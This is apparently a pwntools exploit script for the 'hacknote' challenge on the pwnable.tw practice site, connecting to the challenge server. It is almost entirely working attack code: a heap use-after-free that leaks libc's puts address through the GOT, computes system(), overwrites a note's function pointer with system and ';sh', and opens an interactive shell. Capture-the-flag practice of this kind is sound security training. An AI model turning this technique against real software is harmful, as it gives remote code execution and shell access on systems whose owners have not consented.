from pwn import *

elf = ELF("./hacknote")
# p = process("./hacknote")
p = remote("chall.pwnable.tw", 10102)
# gdb.attach(
#    p,
#    """
##b *0x080488a5
##b *0x08048715
##b *0x0804869f
##b *0x08048731
# """,
# )


"""
first note ctx: 0x80c31a0
first note data: 0x80c31b0

second note ctx: 0x80c31e0
second note data: 0x80c31f0

after freeing these notes, adding third note.

third note ctx: 0x80c31e0 -> pointing to second note ctx
third note data: 0x80c31a0 -> pointing to first note ctx!!!! we can write data here, then trigger printNote on note 0!
"""


r = p


def add_note(size, note):
    r.recvuntil(b":")
    r.sendline(b"1")
    r.recvuntil(b":")
    r.sendline(str(size).encode())
    r.recvuntil(b":")
    r.sendline(note)


def delete_note(index):
    r.recvuntil(b":")
    r.sendline(b"2")
    r.recvuntil(b":")
    r.sendline(str(index).encode())


def print_note(index):
    r.recvuntil(b":")
    r.sendline(b"3")
    r.recvuntil(b":")
    r.sendline(str(index).encode())


info("Adding first note")
add_note(32, b"AAAA")

info("Adding second note")
add_note(32, b"BBBB")

info("Deleting first note")
delete_note(0)

info("Deleting second note")
delete_note(1)

info("Adding third note...")
# we expect third note DATA to be rellocated in the first note CONTEXT!
add_note(8, p32(0x0804862B) + p32(elf.got["puts"]))

info("Printing note 0, triggering leak of libc@puts...")
print_note(0)
p.recvuntil(b":", drop=True)

libc_puts = p.recv(4).ljust(4, b"\x00")
libc_puts = u32(libc_puts)
libc_base = libc_puts - 0x0005F140
info(f"Leaked libc_puts = {libc_puts:#x}")
info(f"libc base: {libc_base:#x}")

with context.quiet:
    libc = ELF("./libc_32.so.6")

system = libc.sym["system"] + libc_base

info("Deleting note at index 2 to reuse it")
delete_note(2)  # free note 2

# add note again
# we expect it to be reallocated in the same place note 2 was allocated,
# and remember: note 2 was allocated such that its DATA pointer, points to the original note 0 CONTEXT.
info("Adding new note, will be reallocated with same ctx and data ptr as previous one")
add_note(8, p32(system) + b";sh\x00")

info("Triggering libc@system...")
print_note(0)

p.clean(timeout=1)
p.interactive()
